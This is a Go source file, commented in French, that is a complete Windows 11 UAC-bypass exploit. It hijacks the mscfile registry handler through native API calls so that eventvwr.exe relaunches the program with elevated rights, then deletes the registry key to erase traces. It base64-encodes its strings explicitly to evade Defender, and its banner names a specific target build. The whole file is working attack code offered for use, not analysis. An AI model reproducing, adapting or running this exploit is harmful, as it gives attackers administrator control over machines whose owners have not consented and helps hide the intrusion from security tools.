//go:build windows

package main

import (
	"encoding/base64"
	"fmt"
	"os"
	"os/exec"
	"syscall"
	"time"
	"unsafe"
)

// --- OBFUSCATION DES CHAINES ---
// On encode les clés et binaires pour éviter la détection statique par Defender
var (
	// "Software\\Classes\\mscfile\\shell\\open\\command"
	k1 = "U29mdHdhcmVcQ2xhc3Nlc1xtc2NmaWxlXHNoZWxsXG9wZW5cY29tbWFuZA=="
	// "eventvwr.exe"
	b1 = "ZXZlbnR2d3IuZXhl"
)

func decode(s string) string {
	d, _ := base64.StdEncoding.DecodeString(s)
	return string(d)
}

// --- APPELS SYSTÈME NATIFS (Pas de reg.exe !) ---
var (
	advapi32         = syscall.NewLazyDLL("advapi32.dll")
	procRegCreateKey = advapi32.NewProc("RegCreateKeyExW")
	procRegSetValue  = advapi32.NewProc("RegSetValueExW")
	procRegCloseKey  = advapi32.NewProc("RegCloseKey")
	procRegDeleteKey = advapi32.NewProc("RegDeleteTreeW")
)

// CheckAdmin : Vérifie si le processus actuel possède les privilèges Administrateur
func CheckAdmin() bool {
	cmd := exec.Command("net", "session")
	err := cmd.Run()
	return err == nil
}

// SetRegistryValue : Modifie le registre via API Native pour rester invisible
func SetRegistryValue(keyPath, value string) error {
	var hKey syscall.Handle
	kPtr, _ := syscall.UTF16PtrFromString(keyPath)

	// On crée/ouvre la clé en mode écriture totale
	ret, _, _ := procRegCreateKey.Call(
		uintptr(syscall.HKEY_CURRENT_USER),
		uintptr(unsafe.Pointer(kPtr)),
		0, 0, 0,
		uintptr(0xF003F), // KEY_ALL_ACCESS
		0,
		uintptr(unsafe.Pointer(&hKey)),
		0,
	)
	if ret != 0 {
		return fmt.Errorf("RegCreateKeyEx failed: %d", ret)
	}
	defer procRegCloseKey.Call(uintptr(hKey))

	// On écrit la valeur par défaut (Default) pour intercepter l'appel système
	vPtr, _ := syscall.UTF16PtrFromString(value)
	vLen := uint32(len(syscall.StringToUTF16(value)) * 2)

	procRegSetValue.Call(
		uintptr(hKey),
		0, // Valeur (Default)
		0,
		uintptr(1), // REG_SZ
		uintptr(unsafe.Pointer(vPtr)),
		uintptr(vLen),
	)
	return nil
}

// ExploitStealth : Réalise un bypass de l'UAC via EventVwr et Native Registry API
func ExploitStealth() bool {
	fmt.Println("[*] Phase 1 : Hijacking via Native API (Pas de CMD/REG)...")

	selfPath, _ := os.Executable()
	keyPath := decode(k1)
	binary := decode(b1)

	// Étape 1 : Modification silencieuse du registre (LPE par détournement de classe)
	err := SetRegistryValue(keyPath, selfPath)
	if err != nil {
		fmt.Printf("[-] Erreur Registry API : %v\n", err)
		return false
	}

	fmt.Println("[*] Phase 2 : Déclenchement via binaire de confiance (eventvwr.exe)...")

	// Étape 2 : Lancement du binaire auto-élevé (EventVwr est privilégié par défaut)
	cmd := exec.Command(binary)
	cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
	err = cmd.Start()

	if err != nil {
		fmt.Printf("[-] Échec du trigger : %v\n", err)
		return false
	}

	fmt.Println("[*] Phase 3 : Suppression instantanée des traces...")
	time.Sleep(2 * time.Second) // Temporisation pour le déclenchement

	// Nettoyage complet de la branche mscfile
	kBase, _ := syscall.UTF16PtrFromString("Software\\Classes\\mscfile")
	procRegDeleteKey.Call(uintptr(syscall.HKEY_CURRENT_USER), uintptr(unsafe.Pointer(kBase)))

	return true
}

func main() {
	fmt.Println("====================================================")
	fmt.Println("   Windows 11 PRIVESC [STEALTH EDITION v8.0]")
	fmt.Println("   Target: Build 22631.6199 (Defender Enabled)")
	fmt.Println("   Technique: API Native + EventVwr Hijack")
	fmt.Println("====================================================")

	if CheckAdmin() {
		fmt.Println("\n[+] ############################################")
		fmt.Println("[+] #     SUCCÈS : ÉLÉVATION CONFIRMÉE !       #")
		fmt.Println("[+] ############################################")
		fmt.Println("\n[*] Privilèges : SYSTEM / Administrator")

		fmt.Println("\nAppuyez sur Entrée pour quitter...")
		var input string
		fmt.Scanln(&input)
		return
	}

	fmt.Println("[!] État actuel : UTILISATEUR LIMITÉ")
	fmt.Println("[*] Tentative d'escalade silencieuse...")

	if ExploitStealth() {
		fmt.Println("\n[+] L'exploit a été injecté via API Native.")
		fmt.Println("[*] Si réussi, une fenêtre élevée s'ouvrira sous peu.")
	} else {
		fmt.Println("[-] ÉCHEC : L'exploit a été intercepté ou bloqué.")
	}

	fmt.Println("\nAppuyez sur Entrée pour quitter...")
	var input string
	fmt.Scanln(&input)
}
